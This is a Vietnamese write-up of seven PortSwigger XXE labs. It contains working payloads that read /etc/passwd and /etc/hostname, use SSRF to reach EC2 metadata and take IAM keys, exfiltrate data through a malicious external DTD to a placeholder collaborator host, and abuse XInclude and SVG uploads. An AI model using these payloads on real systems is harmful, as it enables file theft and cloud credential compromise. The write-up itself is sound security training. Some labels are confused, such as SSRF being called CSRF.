@@ -1,0 +1,278 @@
+---
+title: "XXE Injection Labs — PortSwigger Web Security Academy"
+description: "Write-up chi tiết các bài lab về lỗ hổng XML External Entity (XXE) Injection trên PortSwigger — bao gồm truy xuất tệp, SSRF, Blind XXE Out-of-band, Parameter Entity, External DTD và khai thác qua SVG upload."
+date: "2026-05-19"
+category: "writeup"
+tags: ["xxe", "xml", "injection", "portswigger", "web-security", "ssrf", "blind-xxe"]
+thumbnail: ""
+external_link: ""
+---
+
+## Lab 1: Exploiting XXE using external entities to retrieve files
+
+Mục tiêu của bài lab này là đọc được `/etc/passwd` của hệ thống.
+
+![Lab 1 - Overview](/images/writeups/xxe-labs/image1.png)
+
+Trang web có chức năng check lượng sản phẩm còn tồn trong kho và sử dụng định dạng XML để truyền tải dữ liệu đi thay vì JSON truyền thống.
+
+![Lab 1 - XML request](/images/writeups/xxe-labs/image2.png)
+
+Tuy nhiên, bộ phân tích cú pháp XML (XML Parser) của ứng dụng được cấu hình không an toàn, nó lại cho phép định nghĩa và mở rộng các thực thể bên ngoài (External Entities) bên trong cấu trúc DOCTYPE. Ta sẽ kiểm thử điều này bằng cách thêm một DTD (Document Type Definition) nhạy cảm vào payload XML này.
+
+```xml
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+
+Đoạn mã này khai báo một thực thể tên là `xxe`, buộc máy chủ sử dụng giao thức `file://` để đọc nội dung file hệ thống `/etc/passwd` và lưu vào biến đó.
+
+Tuy nhiên, làm thế nào để hiển thị được biến `xxe` này ra ?
+
+Ta cần tìm ra các biến mà nó được in ra màn hình trong một trường hợp nào đó. Ở đây chính là biến `productId` trong trường hợp nó bị nhập sai.
+
+![Lab 1 - Error reflected](/images/writeups/xxe-labs/image3.png)
+
+Vậy ta chỉ đọc được file khi biến `&xxe;` được đặt ở vị trí mà giá trị của nó sẽ được máy chủ hiển thị ngược lại cho người dùng nhìn thấy. Từ đó, ta sẽ chèn thực thể `xxe` này vào trong `productID`.
+
+![Lab 1 - Inject payload](/images/writeups/xxe-labs/image4.png)
+
+Khai thác thành công , đọc được `/etc/passwd` -> solve lab !
+
+![Lab 1 - Solved](/images/writeups/xxe-labs/image5.png)
+
+## Lab 2: Exploiting XXE to perform SSRF attacks
+
+Mục tiêu của bài lab này là khai thác lỗ hổng XXE để thực hiện tấn công SSRF nhằm lấy được khóa truy cập bí mật IAM của máy chủ từ EC2 metadata endpoint.
+
+![Lab 2 - Overview](/images/writeups/xxe-labs/image6.png)
+
+Trang web có chức năng check lượng sản phẩm còn tồn trong kho và sử dụng định dạng XML để truyền tải dữ liệu đi thay vì JSON truyền thống.
+
+![Lab 2 - XML request](/images/writeups/xxe-labs/image7.png)
+
+![Lab 2 - XML request detail](/images/writeups/xxe-labs/image8.png)
+
+Tuy nhiên, bộ phân tích cú pháp XML (XML Parser) của ứng dụng được cấu hình không an toàn, nó lại cho phép định nghĩa và mở rộng các thực thể bên ngoài (External Entities) bên trong cấu trúc DOCTYPE.
+
+Từ đây, ta sẽ thiết kế payload nhằm tạo ra tấn công CSRF, làm cho server đi lấy dữ liệu của Endpoint Metadata của AWS EC2: `http://169.254.169.254/`
+
+Bonus: `169.254.169.254` là địa chỉ Link-local chuẩn được sử dụng bởi các nhà cung cấp dịch vụ đám mây (AWS, Azure, GCP) để cung cấp Metadata của Instance. Nếu chiếm được IAM Secret Access Key từ đây, attacker có thể chiếm quyền điều khiển toàn bộ tài nguyên Cloud của doanh nghiệp.
+
+![Lab 2 - SSRF payload](/images/writeups/xxe-labs/image9.png)
+
+Nội dung server trả về là "latest", chứng tỏ SSRF thành công !
+
+Sở dĩ nó trả về một path=latest là vì đây là một hệ thống API dạng RESTful được phân cấp theo cấu trúc hình cây. Vì ở gốc này có rất nhiều danh mục dữ liệu khác nhau (thông tin mạng, thông tin định danh, cấu hình máy...), API được thiết kế để trả về danh sách các "endpoints" hoặc "thư mục" con khả dụng để bạn chọn lựa bước đi tiếp theo.
+
+Ta tiếp tục truy cập vào `/latest`.
+
+![Lab 2 - Latest endpoint](/images/writeups/xxe-labs/image10.png)
+
+Tiếp tục truy cập vào phản hồi nhận được
+
+![Lab 2 - Next path](/images/writeups/xxe-labs/image11.png)
+
+Tiếp tục …
+
+![Lab 2 - Deeper path](/images/writeups/xxe-labs/image12.png)
+
+Tiếp tục …
+
+![Lab 2 - IAM path](/images/writeups/xxe-labs/image13.png)
+
+…
+
+![Lab 2 - Secret key](/images/writeups/xxe-labs/image14.png)
+
+Vậy là ở phản hồi này, ta đã thấy được khoá bí mật của Cloud AWS -> solve lab.
+
+![Lab 2 - Solved](/images/writeups/xxe-labs/image15.png)
+
+## Lab 3: Blind XXE with out-of-band interaction
+
+XML Parser của trang web đang được cấu hình không an toàn, cho phép định nghĩa các thực thể bên ngoài (External Entities) thông qua chỉ thị `<!DOCTYPE>`.
+
+Tuy nhiên, kết quả của thực thể sau khi được parser lại không được render ra giao diện người dùng ( Blind ), nên ta không đọc trực tiếp được nội dung nhạy cảm ( như `etc/passwd` ) trên trình duyệt.
+
+![Lab 3 - Blind XXE](/images/writeups/xxe-labs/image16.png)
+
+Mục tiêu của bài lab là thực hiện một truy vấn mạng hướng ra máy chủ của ta ( burp Collaborator ), đây là kỹ thuật OAST (Out-of-Band Application Security Testing).
+
+DTD mà ta chèn vào sẽ có dạng:
+
+```xml
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://xyz123.oastify.com"> ]>
+```
+
+Thay url của Collaborator vào request và gửi lại.
+
+![Lab 3 - Send payload](/images/writeups/xxe-labs/image17.png)
+
+Trong Collaborator đã xuất hiện những request HTTP và DNS.
+
+![Lab 3 - Collaborator hit](/images/writeups/xxe-labs/image18.png)
+
+Khai thác thành công -> solve lab.
+
+![Lab 3 - Solved](/images/writeups/xxe-labs/image19.png)
+
+## Lab 4: Blind XXE with out-of-band interaction via XML parameter entities
+
+Mục tiêu của bài lab này là thực hiện một truy vấn mạng hướng ra máy chủ của ta.
+
+XML Parser của trang web đang được cấu hình không an toàn trong chức năng check tồn kho của sản phẩm, cho phép định nghĩa các thực thể bên ngoài (External Entities) thông qua chỉ thị `<!DOCTYPE>`.
+
+![Lab 4 - Overview](/images/writeups/xxe-labs/image20.png)
+
+![Lab 4 - Request](/images/writeups/xxe-labs/image21.png)
+
+Ta sẽ inject một DTD vào payload này nhằm điều hướng XML parser truy cập vào máy chủ Collaborator  của ta.
+
+![Lab 4 - Blocked](/images/writeups/xxe-labs/image22.png)
+
+Tuy nhiên, hệ thống đã block khai thác này, điều này cho thấy ta không được phép định nghĩa hoặc sử dụng các "External Entity" bên trong một "Internal DTD" theo cách thông thường.
+
+Vậy ngoài cách sử dụng `&xxe` (General Entity) ra , còn những cách nào khác không ?
+
+Ở đây ta sẽ kiểm thử một dạng Entity khác là Parameter Entity -> `%xxe;` Đây là một loại biến đặc biệt chỉ được dùng bên trong phần DTD, giúp ta đóng gói các đoạn mã độc hại buộc server phải thực thi.
+
+![Lab 4 - Parameter entity payload](/images/writeups/xxe-labs/image23.png)
+
+![Lab 4 - Collaborator hit](/images/writeups/xxe-labs/image24.png)
+
+Trong Collaborator đã xuất hiện những request HTTP và DNS -> solve lab.
+
+![Lab 4 - Solved](/images/writeups/xxe-labs/image25.png)
+
+## Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+Mục tiêu của bài lab này là lấy được nội dung của tệp `/etc/hostname`.
+
+Trong bài Lab này, lỗ hổng nằm ở việc ứng dụng xử lý dữ liệu XML ( trong chức năng check tồn kho ) nhưng không phản hồi kết quả trực tiếp (Blind), do đó chúng ta cần kỹ thuật Out-of-Band (OOB) để đẩy dữ liệu ra ngoài.
+
+![Lab 5 - Overview](/images/writeups/xxe-labs/image26.png)
+
+![Lab 5 - Request](/images/writeups/xxe-labs/image27.png)
+
+Vì vậy nên ta sẽ sử dụng kỹ thuật OAST (Out-of-Band Application Security Testing), thực hiện tạo payload DTD độc hại, đọc nội dung của tệp `/etc/hostname` và gửi nó về máy chủ collaborator của ta.
+
+Payload ở đây tồn tại dưới dạng `file.dtd`
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR-ID/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+- `%file`: Đọc nội dung file `/etc/hostname`.
+- `%eval`: Tạo ra một thực thể mới là `%exfil`, thực hiện một request HTTP tới Collaborator với nội dung file gắn vào tham số `x`.
+- `%exfil`: Kích hoạt request đó.
+- Tiếp theo, tã sẽ chèn file này vào máy chủ khai thác.
+
+![Lab 5 - Exploit server](/images/writeups/xxe-labs/image28.png)
+
+Tiếp đến, ta sẽ inject một DTD với thực thể là URL trỏ tới file này trên máy chủ khai thác . DTD này sẽ được chèn vào payload trong Post Request check tồn kho của một sản phẩm.
+
+![Lab 5 - Inject DTD](/images/writeups/xxe-labs/image29.png)
+
+Dữ liệu đã được gửi về collaborator của ta.
+
+![Lab 5 - Exfiltrated data](/images/writeups/xxe-labs/image30.png)
+
+Lấy được nội dung file `/etc/hostname`, nộp và solve lab !.
+
+## Lab 6: Exploiting XInclude to retrieve files
+
+Mục tiêu của bài lab này là đọc được tệp `/etc/passwd`.
+
+![Lab 6 - Overview](/images/writeups/xxe-labs/image31.png)
+
+Trong chức năng check tồn kho, hệ thống sẽ phản ánh lại dữ liệu trong trường `ProductID` nếu nó bị lỗi.
+
+![Lab 6 - Reflected error](/images/writeups/xxe-labs/image32.png)
+
+Nhưng ở bài lab này, XXE Parser đã xử lý dữ liệu XML dưới dạng ngầm phía back-end, tức là ta không thể chèn DTD vào XML payload theo cách thông thường được nữa.
+
+![Lab 6 - DTD blocked](/images/writeups/xxe-labs/image33.png)
+
+Vậy còn cách nào khác không ?
+
+Ở đây ta sẽ sử dụng kỹ thuật XInclude (XML Inclusions), đây là một tính năng của XML cho phép gộp nội dung của một tệp tin khác (có thể là file văn bản thô hoặc một file XML khác) trực tiếp vào giữa tài liệu XML hiện tại. Ta sẽ thiết lập một XML Document dưới đây:
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+- `xmlns:xi="..."`: Khai báo quyền sử dụng tính năng nhúng file (XInclude).
+- `xi:include`: Lệnh gọi máy chủ thực hiện việc nhúng dữ liệu.
+- `parse="text"`: Ép máy chủ đọc file dưới dạng văn bản thô để tránh bị lỗi cú pháp XML.
+- `href="file://..."`: Đường dẫn đến tệp tin bí mật cần lấy trên máy chủ (`/etc/passwd`).
+- Tiếp đến, chèn XML Document này vào biến `productId` và gửi lại request, nội dung của biến `productID`, khi này là `etc/passwd` sẽ được in ra ->solve lab.
+
+![Lab 6 - XInclude payload](/images/writeups/xxe-labs/image34.png)
+
+![Lab 6 - Solved](/images/writeups/xxe-labs/image35.png)
+
+## Lab 7: Thực hành: Khai thác XInclude để truy xuất tệp
+
+Mục tiêu của bài lab này là đọc được tệp `/etc/passwd`.
+
+Trang web có chức năng up ảnh khi cmt, định dạng ảnh hỗ trợ là các file ảnh, trong đó có một định dạng đặc biệt là `file.svg`
+
+![Lab 7 - Overview](/images/writeups/xxe-labs/image36.png)
+
+Sau khi tìm hiểu về file svg, ta được biết file này được cấu trúc hoàn toàn bằng XML.
+
+Trang web lại sử dụng thư viện Apache Batik để xử lý các tệp hình ảnh đại diện. Thư viện này lại cho phép phân tích cú pháp các thực thể bên ngoài (External Entities) và dùng thẻ đồ họa (`<text>`) để hiển thị trực tiếp nội dung của một thực thể hệ thống lên bức ảnh. Điều mà các file ảnh khác như `jpg`, `png`,… không có.
+
+Vì SVG được viết bằng XML, nên ta có thể chèn những thực thể độc hại để kích hoạt lỗ hổng XXE. Khi đó, thu viện Apache Batik sẽ xử lý, thực thi và in thực thể đó ngay lên bức ảnh !.
+
+Đầu tiên, ta up một tấm ảnh bất kỳ và bắt lấy request POST ảnh.
+
+![Lab 7 - Upload request](/images/writeups/xxe-labs/image37.png)
+
+Tiếp đến, ta sẽ sửa nội dung bức ảnh thành định dạng XML, trong đó sẽ chèn thêm một thực thể XML với nội dung là `/etc/hostname`.
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///etc/hostname" >
+]>
+<svg width="200px" height="50px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="10" y="30">&xxe;</text>
+</svg>
+```
+
+Mã độc SVG này định nghĩa một thực thể bên ngoài (`&xxe;`) để khai thác lỗ hổng XXE, tự động truy cập và đọc file `/etc/hostname` trên máy chủ. Khi thư viện backend xử lý hình ảnh, thẻ `<text>` sẽ gọi thực thể này và in trực tiếp hostname lên bề mặt bức ảnh.
+
+Cuối cùng, ta sửa trường filename và content-type trong request sao cho khớp với định dạng SVG.
+
+![Lab 7 - Modified request](/images/writeups/xxe-labs/image38.png)
+
+Gửi lại request.
+
+![Lab 7 - Uploaded](/images/writeups/xxe-labs/image39.png)
+
+![Lab 7 - Response](/images/writeups/xxe-labs/image40.png)
+
+Sau khi gửi thành công, ta vào phần cmt và kiểm tra bức ảnh.
+
+![Lab 7 - Comment image](/images/writeups/xxe-labs/image41.png)
+
+Phóng to bức ảnh, ta thấy nội dung file `etc/hostname` đã được in lên tấm ảnh.
+
+![Lab 7 - Hostname visible](/images/writeups/xxe-labs/image42.png)
+
+Nộp nội dung này -> solve lab.
+
+![Lab 7 - Submit](/images/writeups/xxe-labs/image43.png)
+
+![Lab 7 - Solved](/images/writeups/xxe-labs/image44.png)
+
+## Tham khảo
+
+- [PortSwigger — XXE Injection Labs](https://portswigger.net/web-security/xxe)
+- [PortSwigger — Blind XXE](https://portswigger.net/web-security/xxe/blind)
